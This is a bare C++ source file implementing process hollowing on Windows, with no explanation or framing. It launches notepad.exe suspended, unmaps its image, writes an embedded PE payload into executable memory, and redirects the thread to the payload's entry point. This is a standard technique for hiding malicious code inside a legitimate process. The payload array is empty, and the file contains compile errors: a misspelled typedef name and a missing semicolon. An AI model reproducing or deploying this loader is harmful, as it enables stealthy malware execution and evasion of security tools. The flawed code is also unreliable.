#include "Windows.h"
#include "iostream"

typedef NTSTATUS(NTAPI* NtUnmapViewOfSction_t)(HANDLE, PVOID);

unsigned char payload[] = {
    
}

int main() {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    BOOL success = CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!success) return 1;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);

    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase);

    LPVOID remote_image = VirtualAllocEx(pi.hProcess, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote_image, payload, nt->OptionalHeader.SizeOfHeaders, NULL);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(payload + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + i * sizeof(IMAGE_SECTION_HEADER));
        WriteProcessMemory(pi.hProcess,
            (LPVOID)((uintptr_t)remote_image + section->VirtualAddress),
            payload + section->PointerToRawData,
            section->SizeOfRawData,
            NULL);
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _M_X64
    ctx.Rcx = (uintptr_t)remote_image + nt->OptionalHeader.AddressOfEntryPoint;
    ctx.Rip = ctx.Rcx;
#else
    ctx.Eax = (uintptr_t)remote_image + nt->OptionalHeader.AddressOfEntryPoint;
    ctx.Eip = ctx.Eax;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
